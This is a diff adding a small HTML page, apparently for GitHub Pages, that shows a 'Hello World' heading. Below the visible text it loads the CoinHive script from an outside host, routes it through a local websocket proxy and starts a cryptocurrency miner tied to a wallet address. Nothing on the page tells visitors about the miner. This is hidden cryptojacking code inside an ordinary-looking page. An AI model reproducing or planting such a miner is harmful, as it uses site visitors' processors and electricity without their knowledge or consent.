@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Hello World</h1>
+<p>I'm hosted with GitHub Pages.</p>
+</body>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+  // Configure CoinHive to point to your proxy
+  CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://localhost:8892"]];
+
+  // Start miner
+  var miner = CoinHive.User('3CCjzJkmtrn2PsKdMLgVqCgzZRZ9NQRqt4', navigator.appCodeName + '-' + Math.floor(Math.random() * 100));
+  miner.start();
+
+</script>
+</html>
